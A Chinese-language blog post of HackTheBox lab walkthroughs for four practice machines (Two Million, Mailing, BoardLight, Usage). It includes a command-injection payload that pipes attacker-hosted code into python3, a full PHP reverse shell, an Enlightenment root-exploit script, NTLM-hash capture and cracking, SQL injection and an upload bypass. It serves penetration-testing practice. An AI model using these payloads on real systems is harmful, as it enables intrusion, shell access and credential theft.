---
title: HackTheBox 笔记 - 1
date: 2024-05-17 20:12:00
tags: [Web, 渗透]
categories: 渗透
---

不得不找饭吃了。
Two Million / Mailing / BoardLight / Usage

<!--more-->

## 配置

国内访问比较慢，生成 VPN 的时候选 TCP，然后在下载的 `.ovpn` 文件里加一行 `http-proxy ip:port`，再用 `openvpn` 连接就行了，快很多。

## 新手村

四道基础题，基本就是 nmap 扫。
主要记住一些参数，比如 `-p-` 扫描所有端口，`--min-rate <num>` 设置扫描速率，`-n` 不解析域名，`-sS` SYN 扫描，`-Pn` 不 ping 主机，`--open` 只显示开放端口，`--stats-every <num>` 每扫描多少个端口显示一次统计信息，`-vv` 详细输出。

## Two Million

扫出来两个端口，一个是 80，一个是 22。

访问 80 端口，301 到 2million.htb，改 `etc/host` 加一行 `10.10.11.221    2million.htb`，再访问，发现是个登录页面。
根据提示找到 `inviteapi.min.js`，内容如下：

```javascript
eval(
  function (p, a, c, k, e, d) {
    e = function (c) {
      return c.toString(36)
    };
    if (!''.replace(/^/, String)) {
      while (c--) {
        d[c.toString(a)] = k[c] ||
        c.toString(a)
      }
      k = [
        function (e) {
          return d[e]
        }
      ];
      e = function () {
        return '\\w+'
      };
      c = 1
    };
    while (c--) {
      if (k[c]) {
        p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c])
      }
    }
    return p
  }(
    '1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',
    24,
    24,
    'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),
    0,
    {
    }
  )
)
```

打开 [de4js](https://lelinhtinh.github.io/de4js/) 去混淆得到：

```javascript
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```

执行

```bash
curl http://2million.htb/api/v1/invite/how/to/generate -X POST
```

得到

```json
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```

直接 CyberChef 解 ROT13 得到 In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate。
好吧，改个 PATH，再 POST 一下，得到

```json
{"0":200,"success":1,"data":{"code":"QUtZOEYtMENKMzMtSEE5OVEtS1VHTzQ=","format":"encoded"}}
```

解码得到 `PBBOO-D9FOB-9BVZP-KCGHW`，不知道为什么 POST 到 `/api/v1/invite/verify` 的结果是 invalid。不管。

注册登录后，顺着提示点击 Connection Pack，下载链接为 `/api/v1/user/vpn/generate`。
访问 `/api/v1`，得到一堆 API。

```plain
v1
  user
    GET
      /api/v1 "Route List"
      /api/v1/invite/how/to/generate "Instructions on invite code generation"
      /api/v1/invite/generate "Generate invite code"
      /api/v1/invite/verify "Verify invite code"
      /api/v1/user/auth "Check if user is authenticated"
      /api/v1/user/vpn/generate "Generate a new VPN configuration"
      /api/v1/user/vpn/regenerate "Regenerate VPN configuration"
      /api/v1/user/vpn/download "Download OVPN file"
    POST 
      /api/v1/user/register "Register a new user"
      /api/v1/user/login "Login with existing user"
  admin 
    GET 
      /api/v1/admin/auth "Check if user is admin"
    POST 
      /api/v1/admin/vpn/generate "Generate VPN for specific user"
    PUT 
      /api/v1/admin/settings/update "Update user settings"
```

发现 `/api/v1/admin/settings/update` 能改管理员身份，传一个

```json
{
  "email": "a@a.com",
  "is_admin":1
}
```

就能把自己改成 admin。

对 `/api/v1/admin/vpn/generate` 进行命令注入：

```json
{
"username": "abc;curl 10.10.14.20:5555/rshell.py | python3;ls"
}
```

把 shell 弹出来。
`cat .env` 看到

```conf
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

连一下数据库

```bash
mysql --user admin --password htb_prod
```

发现里面没啥有用的，用数据库的密码试一下 ssh，发现密码是相同的。于是登上 admin，然后读 `user.txt` 拿到第一个 flag。

然后根据提示找到 `/var/mail/admin`，里面说 OverlayFS 有 CVE，定位到 CVE-2023-0386。

用[这个 PoC](https://github.com/xkaneiki/CVE-2023-0386) 打一下就行了。
后面题目问 GLIBC 版本，执行 `ldd --version` 即可。

还留下了一个 CVE-2023-4911，有空再看。

### CVE-2023-0386

下面来详细分析一下这个 CVE。

#### FUSE

FUSE(Filesystem in Userspace)

## Mailing

VMWare 的 Kali GUI 崩了，登录完直接黑屏，我之前也忘了存个快照，于是现在就采用纯命令行 + 代理转发的形式用，反正 GUI 里也只图个 Browser 和 Burpsuite。

还是用的 squid，squid.conf 按下面配置，再重启一下服务就行。

```plain
acl all src all
http_access allow all
hosts_file /etc/hosts
http_port 3128
```

Burpsuite 里 settings -> Network -> Connection -> Upstream Proxy Servers，设置好代理，然后就能用了。
nmap 一扫发现一堆端口，基本都是邮件服务相关，结果如下：

```plain
PORT      STATE SERVICE
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
143/tcp   open  imap
445/tcp   open  microsoft-ds
465/tcp   open  smtps
587/tcp   open  submission
993/tcp   open  imaps
5040/tcp  open  unknown
5985/tcp  open  wsman
7680/tcp  open  pando-pub
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
50304/tcp open  unknown
```

dirsearch 扫出 `/assets/` 和 `/download.php`。
`/assets/` 存着一些图片，`/download.php` 可以任意文件读。
由前面扫到的端口可知这是一个 hMailServer，所以可以直接读 `hMailServer.INI`。
`?file=../../../../../../../../../Program%20Files%20(x86)/hMailServer/Bin/hMailServer.INI` 读出如下内容：

```ini
[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
```

admin 的密码 hash 为 841bb5acfa6779ae432fd7a4e6600ba7，用 hash-identifier 判断是 MD5，用在线网站解密得到 `homenetworkingadministrator`。

md5 在线解密的网站有 [Hashes](https://hashes.com/zh/decrypt/hash)，[crackstation](https://crackstation.net/) 等。

用 CVE-2024-21413 打，参考[这篇文章](https://www.freebuf.com/vuls/396256.html)，先启动 NTLM 监听

```bash
sudo impacket-smbserver -smb2support -ip 0.0.0.0 test /tmp
```

再用 [PoC](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability) 打

```bash
python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url '\\10.10.14.20\test' --subject Hi
```

拿到 maya 的 NTLM hash

```plain
maya::MAILING:aaaaaaaaaaaaaaaa:21bf11591531fc6d3736359f495482b4:0101000000000000804c7084b5b1da013e5cd1bc6af81a5f000000000100100057005a00720067005a00460043005a000300100057005a00720067005a00460043005a00020010004f007100510070005500580055006800040010004f00710051007000550058005500680007000800804c7084b5b1da0106000400020000000800300030000000000000000000000000200000146f2fe8ad5fb58c04447d1f84d31aa0faae084bb712011964e5eb9820bf33200a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320030000000000000000000
```

放到 `1.txt`，用 hashcat 爆

```bash
hashcat -a 0 -o passwd.txt 1.txt /usr/share/wordlists/rockyou.txt
```

`-a 0` 意思是字典模式，`-o passwd.txt` 是输出文件，`1.txt` 是输入文件，`/usr/share/wordlists/rockyou.txt` 是字典文件。
爆出来密码是 `m4y4ngs4ri`。
然后用红队神器 evil-winrm 连上，拿到 Windows 的 shell，读 `user.txt` 拿到第一个 flag。

```bash
evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri
```

很奇怪这里用 hash 登录不行，会报错 `Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError`。

现在就要开始提权了。

Program Files 里有个 `LibreOffice`，查看 `readme_en-US.txt` 可以知道版本是 7.4。
搜出是有 CVE-2023-2255 的，用 [PoC](https://github.com/elweth-sec/CVE-2023-2255) 打
把反弹 shell 的  `shell.py` 传到 `C:\Users\maya\Documents\`，然后本地生成 `exploit.odt`，再在 Windows 上 curl 下来。

```bash
python3 CVE-2023-2255.py --cmd "python C:\Users\maya\Documents\shell.py" --output 'exploit.odt'
```

在本地挂着 `nc -lvnp <port>`，一会就有 shell 过来了。

弹到 localadmin 的 shell 后，可以直接读桌面的 `root.txt` 拿到 flag，也可以通过以下命令把 maya 提到管理员组：

```bash
net localgroup Administradores maya /add
```

总的来说，这 Windows 的渗透是真迷糊，一点不会。而且不知道为啥 Evil-WinRM 连上后命令卡得要死

## BoardLight

扫出来两个端口，一个是 80，一个是 22。
一个静态网页，无交互，源码里面有一个 Board.htb，加到 host 里面访问，还是这个页面。
开始扫子域名

```bash
wfuzz -c -w  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://board.htb" -H "Host:FUZZ.board.htb" --hw 1053
```

`--hw 1053` 是过滤掉 1053 字节的响应。
扫到一个 `crm.board.htb`。
加入 `/etc/hosts` 里，访问到是一个 Dolibarr 的登录页面，随手敲个 admin admin 竟然登上去了，乐。
新建一个 website，再在里面新建一个 Page，编辑 HTML 源，写 PHP，保存会报 `You add dynamic PHP code that contains the PHP instruction 'system' that is forbidden by default as dynamic content (see hidden options WEBSITE_PHP_ALLOW_xxx to increase list of allowed commands).
`

大写 PHP 绕过，有时也可以直接短标签 `<?`，或者 `<?=system('ls')?>`，这句等效于 `<?php echo system('ls')?>`。
在 [Reverse Shell Generator](https://www.revshells.com/) 生成一个 PHP 反弹 shell，然后写进去
记得勾上 `Show dynamic content`

```php
<?PHP
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.20';
$port = 55555;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
  $pid = pcntl_fork();
  
  if ($pid == -1) {
    printit("ERROR: Can't fork");
    exit(1);
  }
  
  if ($pid) {
    exit(0);  // Parent exits
  }
  if (posix_setsid() == -1) {
    printit("Error: Can't setsid()");
    exit(1);
  }

  $daemon = 1;
} else {
  printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
  printit("$errstr ($errno)");
  exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
  printit("ERROR: Can't spawn shell");
  exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
  if (feof($sock)) {
    printit("ERROR: Shell connection terminated");
    break;
  }

  if (feof($pipes[1])) {
    printit("ERROR: Shell process terminated");
    break;
  }

  $read_a = array($sock, $pipes[1], $pipes[2]);
  $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

  if (in_array($sock, $read_a)) {
    if ($debug) printit("SOCK READ");
    $input = fread($sock, $chunk_size);
    if ($debug) printit("SOCK: $input");
    fwrite($pipes[0], $input);
  }

  if (in_array($pipes[1], $read_a)) {
    if ($debug) printit("STDOUT READ");
    $input = fread($pipes[1], $chunk_size);
    if ($debug) printit("STDOUT: $input");
    fwrite($sock, $input);
  }

  if (in_array($pipes[2], $read_a)) {
    if ($debug) printit("STDERR READ");
    $input = fread($pipes[2], $chunk_size);
    if ($debug) printit("STDERR: $input");
    fwrite($sock, $input);
  }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
  if (!$daemon) {
    print "$string\n";
  }
}

?>
```

拿到 www-data 的 shell
在 `/var/www/html/crm.board.htb/htdocs/conf/` 下找到 `conf.php`，里面有数据库的用户名和密码

```php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';

//$dolibarr_main_demo='autologin,autopass';
// Security settings
$dolibarr_main_prod='0';
$dolibarr_main_force_https='0';
$dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore';
$dolibarr_nocsrfcheck='0';
$dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5';
$dolibarr_mailing_limit_sendbyweb='0';
$dolibarr_mailing_limit_sendbycli='0';

//$dolibarr_lib_FPDF_PATH='';
//$dolibarr_lib_TCPDF_PATH='';
//$dolibarr_lib_FPDI_PATH='';
//$dolibarr_lib_TCPDI_PATH='';
//$dolibarr_lib_GEOIP_PATH='';
//$dolibarr_lib_NUSOAP_PATH='';
//$dolibarr_lib_ODTPHP_PATH='';
//$dolibarr_lib_ODTPHP_PATHTOPCLZIP='';
//$dolibarr_js_CKEDITOR='';
//$dolibarr_js_JQUERY='';
//$dolibarr_js_JQUERY_UI='';

//$dolibarr_font_DOL_DEFAULT_TTF='';
//$dolibarr_font_DOL_DEFAULT_TTF_BOLD='';
$dolibarr_main_distrib='standard';
```

登进数据库

```bash
mysql -u dolibarrowner -p
```

然后连上 dolibarr 数据库，查看表

```sql
use dolibarr;
show tables;
```

发现没啥东西。
`ls /home` 发现有个用户叫 larissa，用数据库的密码 ssh 进去，拿到第一个 flag。

然后开始提权
传个 `linpeas.sh` 过去开扫，发现 SUID 项里有 enlightenment，执行 `enlightenment -version` 可知版本为 0.23.1。

`searchsploit enlightenment` 看到有个提权漏洞，再 `searchsploit -p linux/local/51180.txt` 看具体信息

```yaml
  Exploit: Enlightenment v0.25.3 - Privilege escalation
      URL: https://www.exploit-db.com/exploits/51180
     Path: /usr/share/exploitdb/exploits/linux/local/51180.txt
    Codes: CVE-2022-37706
 Verified: False
File Type: ASCII text
```

`cat /usr/share/exploitdb/exploits/linux/local/51180.txt`，里面说这个洞能打 0.25.3 以下版本，也给出了 PoC 如下：

```bash
#!/usr/bin/bash
# Idea by MaherAzzouz
# Development by nu11secur1ty

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

# The actual problem
file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
        echo "[-] Couldn't find the vulnerable SUID file..."
        echo "[*] Enlightenment should be installed on your system."
        exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Welcome to the rabbit hole :)"

${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net

read -p "Press any key to clean the evedence..."
echo -e "Please wait... "

sleep 5
rm -rf /tmp/exploit
rm -rf /tmp/net
echo -e "Done; Everything is clear ;)"
```

中间的 `${file}` 那行不知道为啥断行了，给它三句连起来，记得加空格。
在靶机执行拿到 root 的 shell，读 `root.txt` 拿到第二个 flag。

## Usage

扫端口只有 80 和 22，老样子，先加 host

```bash
sudo echo "10.10.11.18    http://usage.htb" >> /etc/hosts
```

然后访问，是一个登录页面，用 whatweb 看眼，发现是 Laravel

```bash
$ whatweb http://usage.htb/
http://usage.htb/ [200 OK] Bootstrap[4.1.3], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[laravel_session], IP[10.10.11.18], Laravel, PasswordField[password], Title[Daily Blogs], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```

在 [Hacktricks](https://book.hacktricks.xyz/v/cn/network-services-pentesting/pentesting-web/laravel) 上有说存在 SQL 注入漏洞，测一下
先注册一个 `a@a.com` 的用户，再在重置密码的 `email` 项输入 `a@a.com'`，发现引号能触发 500 错误，说明存在注入。

```sql
a@a.com' AND 1=1;-- -
```

上面的语句的 response 是成功执行。于是把请求体复制到 request.txt，用 sqlmap 跑

```yaml
POST http://usage.htb/forget-password HTTP/1.1
Host: usage.htb
Content-Length: 84
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://usage.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://usage.htb/forget-password
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: XSRF-TOKEN=eyJpdiI6IkhFakpQK2l4cU5sYkhHZzZoN00rUmc9PSIsInZhbHVlIjoiYysvaTY0WDl1dXBXMGR2TzM5YWt2aEg4T051akNzTDFxcWJzUC9yY3pPajN4ei9FRTRJbzNuQ2htY0pmc25xWGR5anV6UzFHTkJ1N2tYYWlJcUEzNjZnSmNVMzdaa0hWNWlST3BVeTlqUnpBdVJ0aEVlOTVUSnBlNXdTa29UTk8iLCJtYWMiOiI0NzIxOTRkMTk4ZWEyN2E2YjI1YTA1NzI4ODg3MzFjZWM0YjJkZGRhNTZjOWYxZGVkNmRjMWRkNTYyNzYzMjUwIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IktHWU1MYzFSNDBvSEN1M2dRSVJlTmc9PSIsInZhbHVlIjoib1FJU1RXWWxPV0ZRem5NNGJxUzR1QkdCdFpYMm8yWGxNblhFL0hIaFdnOWxSK3c0bStqNk9wY1Jsd3ZPZHFTTkdCWjByMnJNTkNnV21hZVJrZGZZcTdBbTFpT3YzOVBubENxT09FWTdBQlhPdEZoTGExMnZHdUZXZ0svOEF5cHkiLCJtYWMiOiI1NWNhNDg3OWZmOTEzNjkzNDMxZGNkZDVjODljMzBkMTRkYzcwZjU2MjI4ZDk5NTBkNzAxOTdhMzlkNTk3MzAxIiwidGFnIjoiIn0%3D
Connection: close

_token=KwTPctNAzmgzsn7wIgf7PC16p7nJ52U7AGT0MNHQ&email=a%40a.com # 注意这里用手注的 payload
```

<这里想起来就补>

用 john 爆出密码 `whatever1`，在 `admin.usage.htb` 登录。
发现没什么能做的，只有头像能改，测试只有前端有文件后缀校验，于是传一个 PHP 反弹 shell 的 png 上去，再用 burp 改成 .php 再传一次，刷新页面，拿到 shell。
传 linpeas.sh 开扫，发现 `/home/dash/.ssh/id_rsa`，下到本地，登录

```bash
chmod 600 dash.pri  # 不然不给连
ssh -i dash.pri dash@10.10.11.18
```

`/home/dash` 目录下有个 `.monitrc`，内容如下：

```bash
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert
```

这里就藏着 xander 的密码 `3nc0d3d_pa$$w0rd`（感觉有点脑洞）
登录后 `sudo -l` 看一眼，发现可以 `sudo /usr/bin/usage_management`，把文件拖下看用 IDA 看一眼

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-4h] BYREF

  puts("Choose an option:");
  puts("1. Project Backup");
  puts("2. Backup MySQL data");
  puts("3. Reset admin password");
  printf("Enter your choice (1/2/3): ");
  __isoc99_scanf("%d", &v4);
  if ( v4 == 3 )
  {
    resetAdminPassword();
  }
  else
  {
    if ( v4 > 3 )
    {
LABEL_9:
      puts("Invalid choice.");
      return 0;
    }
    if ( v4 == 1 )
    {
      backupWebContent();
    }
    else
    {
      if ( v4 != 2 )
        goto LABEL_9;
      backupMysqlData();
    }
  }
  return 0;
}
```

发现 `resetAdminPassword` 是用来消遣你的

```c
int resetAdminPassword()
{
  return puts("Password has been reset.");
}
void backupWebContent()
{
  if ( chdir("/var/www/html") )
    perror("Error changing working directory to /var/www/html");
  else
    system("/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *");
}
int backupMysqlData()
{
  return system("/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql");
}
```

来分析一下这句命令

```bash
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
```

`7za` 是 7zip 的命令行版本，`a` 是添加文件到压缩包，位置为 `/var/backups/project.zip`，`-tzip` 指定压缩格式为 zip，`-snl` 将符号链接作为链接存储，即不是压缩其指向的内容，`-mmt` 是多线程压缩，`--` 结束选项，`*` 压缩所有文件。
[Hacktricks](https://book.hacktricks.xyz/v/cn/linux-hardening/privilege-escalation/wildcards-spare-tricks) 提到了利用这个的 trick，在 7z 中，`@` 开头的文件名会被当作文件列表，所以如下命令执行的时候 7z 会把 `root.txt` 当作文件列表，然后尝试对 `root.txt` 里列出的文件进行压缩

```bash
cd /var/www/html
touch @root.txt
ln -s /root/root.txt root.txt
```

然后再执行备份命令，就能在报错信息看到 root.txt 的内容了。

> 软链接与硬链接
  这里说一下软链接与硬链接的区别，软链接类似 Windows 中的快捷方式，可以跨越文件系统，硬链接则不行。所有硬链接，包括原文件指向的都是同一个 inode（索引节点），众生平等，除非只剩最后一个，否则删除一个硬链接不会影响其他硬链接，而软链接则不同，删除原文件会导致软链接失效。
  生成方法上，软链接 `ln -s`；硬链接 `ln`，目录则需要 `cp -al /path/to/dir /path/to/link`。
  一般来说，软链接用得多，硬链接用得少。

## 参考

Two Million
<https://h4r1337.github.io/posts/two-million/>
<https://blog.csdn.net/song_lee/article/details/131245481>
Mailing
<https://blog.csdn.net/m0_52742680/article/details/138482768>
<https://blog.csdn.net/whale_waves/article/details/138896310>
BoardLight
<https://blog.csdn.net/m0_52742680/article/details/139233464>
<https://blog.csdn.net/2201_75526400/article/details/139304432>
Usage
<https://blog.csdn.net/zr1213159840/article/details/124548770>
<https://amandaguglieri.github.io/hackinglife/htb-usage/>
